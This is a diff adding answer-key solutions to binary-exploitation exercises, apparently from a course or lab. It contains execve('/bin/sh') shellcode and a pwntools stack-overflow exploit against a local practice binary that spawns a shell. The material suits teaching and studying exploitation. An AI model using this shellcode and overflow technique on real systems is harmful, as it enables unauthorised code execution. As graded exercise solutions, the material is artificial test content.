@@ -95,3 +95,63 @@ payload = padding + win_addr
 p.sendline(payload)
 p.interactive()
 ```
+
+## Solution to [Q6]:
+```c
+int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);
+```
+
+First argument is a `const char`.
+
+## Solution to [Q7]:
+We find the address of `/bin/sh` at runtime:
+```python
+jmp get_binsh       
+
+start:
+    pop rdi         
+    xor rsi, rsi    
+    xor rdx, rdx    
+    mov rax, 59         # 59 is the linux system call for execve
+    syscall
+
+get_binsh:
+    call start          # pushes the string onto the stack
+    .string "/bin/sh"   
+```
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+import os
+
+context.update(arch='amd64', os='linux')
+context.binary = './bin/ex4'
+target = process('./bin/ex4')
+
+shellcode = asm('''
+    jmp get_binsh
+start:
+    pop rdi
+    xor rsi, rsi
+    xor rdx, rdx
+    mov rax, 59
+    syscall
+get_binsh:
+    call start
+    .string "/bin/sh"
+''')
+
+# find the offset using the script from [Q5]
+padding = b'A' * (264 - len(shellcode))
+payload = padding + shellcode
+
+target.recvuntil(b'Buffer at ')
+buffer_address = int(target.recvline().strip(), 16)
+
+payload += p64(buffer_address + len(padding))
+
+target.send(payload)
+target.interactive()
+```
